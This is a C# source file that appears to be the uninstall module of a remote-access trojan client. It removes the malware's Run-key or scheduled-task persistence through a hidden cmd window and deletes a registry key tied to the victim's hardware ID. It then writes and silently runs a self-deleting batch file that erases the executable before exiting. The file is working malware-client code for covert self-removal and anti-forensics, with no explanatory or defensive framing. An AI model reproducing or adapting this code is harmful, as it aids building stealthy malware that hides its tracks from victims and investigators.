using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Plugin.Handler
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Plugin.Install))
            {
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath));
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /delete /f  /tn " + "\"" + Path.GetFileNameWithoutExtension(Application.ExecutablePath) + "\"",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }
                }
                catch { }
            }

            try
            {
                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
            }
            catch { }

            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 3 > NUL");
                sw.WriteLine("CD " + Application.StartupPath);
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                sw.WriteLine("CD " + Path.GetTempPath());
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
            }
            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Methods.ClientExit();
            Environment.Exit(0);
        }
    }

}
